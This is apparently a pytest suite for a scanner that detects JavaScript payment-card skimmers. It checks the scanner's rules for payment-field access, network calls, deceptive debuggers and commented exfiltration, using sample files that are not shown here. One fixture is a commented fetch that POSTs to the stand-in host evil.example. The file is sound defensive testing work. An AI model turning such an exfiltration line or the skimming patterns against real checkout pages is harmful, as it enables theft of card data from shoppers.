import sys, pathlib
sys.path.insert(0, str(pathlib.Path(__file__).parent.parent))
import scanner

SAMPLES = pathlib.Path(__file__).parent.parent / "samples"

def rules(result):
    return {f["rule_id"] for f in result["findings"]}

def test_skimmer_sample_flagged_critical():
    code = (SAMPLES / "suspicious-debugger.js").read_text()
    r = scanner.analyze(code, "payment-debugger.js")
    assert r["counts"]["critical"] >= 1, r["findings"]
    assert "DOC_WIDE_LISTENER" in rules(r)
    assert "PAYMENT_FIELD_ACCESS" in rules(r)
    assert "NETWORK_CALL" in rules(r)
    # the live sendBeacon path must be critical/confirmed
    net = [f for f in r["findings"] if f["rule_id"] == "NETWORK_CALL"]
    assert any(f["severity"] == "critical" and f["confidence"] == "confirmed" for f in net)

def test_deceptive_debugger_flagged():
    code = (SAMPLES / "suspicious-debugger.js").read_text()
    r = scanner.analyze(code, "payment-debugger.js")
    assert "DECEPTIVE_DEBUGGER" in rules(r)

def test_commented_exfil_distinguished_from_live():
    code = (SAMPLES / "suspicious-debugger.js").read_text()
    r = scanner.analyze(code, "payment-debugger.js")
    commented = [f for f in r["findings"] if f["rule_id"] == "COMMENTED_EXFIL"]
    assert commented, "commented-out fetch must be reported as an indicator"
    f = commented[0]
    assert f["confidence"] == "indicator"
    assert "does NOT run" in f["explanation"] or "not" in f["explanation"].lower()
    # the commented fetch line must be the one reported
    lines = code.split("\n")
    assert "fetch" in lines[f["line"] - 1]

def test_safe_script_not_critical():
    code = (SAMPLES / "safe-script.js").read_text()
    r = scanner.analyze(code, "safe-script.js")
    assert r["counts"]["critical"] == 0, r["findings"]
    assert r["risk_score"] < 50

def test_plain_fetch_alone_is_not_critical():
    code = "fetch('/api/products').then(r => r.json()).then(show);"
    r = scanner.analyze(code, "shop.js")
    assert r["counts"]["critical"] == 0

def test_redaction_removes_card_numbers():
    code = "// test card 4111111111111111 and 4111-1111-1111-1111\nvar x = 1;"
    assert "4111" not in scanner.redact(code)

def test_findings_have_line_explanation_remediation():
    code = (SAMPLES / "suspicious-debugger.js").read_text()
    r = scanner.analyze(code, "payment-debugger.js")
    for f in r["findings"]:
        assert f["line"] >= 1 and f["explanation"] and f["remediation"] and f["severity"]

def test_comment_only_network_is_not_confirmed_exfil():
    code = "// fetch('https://evil.example', {method:'POST'})\nvar ok = 1;"
    r = scanner.analyze(code, "x.js")
    assert not any(f["rule_id"] == "NETWORK_CALL" for f in r["findings"])
    assert any(f["rule_id"] == "COMMENTED_EXFIL" for f in r["findings"])
    assert r["summary"]["has_confirmed_exfil_path"] is False
